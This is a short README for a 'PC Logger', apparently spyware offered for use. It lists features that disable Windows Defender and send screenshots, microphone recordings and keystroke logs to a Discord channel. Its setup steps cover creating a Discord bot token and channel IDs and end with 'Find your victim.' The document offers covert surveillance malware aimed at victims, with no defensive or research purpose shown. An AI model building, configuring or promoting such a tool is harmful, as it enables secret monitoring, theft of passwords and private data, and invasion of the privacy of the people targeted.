# PC Logger
- Disables Windows Protector (so the loggers work)
- Sends Screenshots to discord channel (every 3 sec)
- Sends Microphone audio to discord channel (2 min intervals)
- Sends Key Logs to discord channel (2 min intervals)
- Local discord bot

# Instructions
1. Create discord bot.
2. Create .env.
3. Inside .env write: 
- TOKEN="DISCORD BOT TOKEN HERE"

4. Inside src\main_sender.py insert ids (line: 13): 
- guild = "SERVER ID"
- screenshot_channel = "SCREENSHOT CHANNEL ID"
- microphone_channel = "MICROPHONE CHANNEL ID"
- logger_channel = "COMMANDS CHANNEL ID"
- connect_channel = "CONNECTION MESSAGE CHANNEL ID"

5. Find your victim.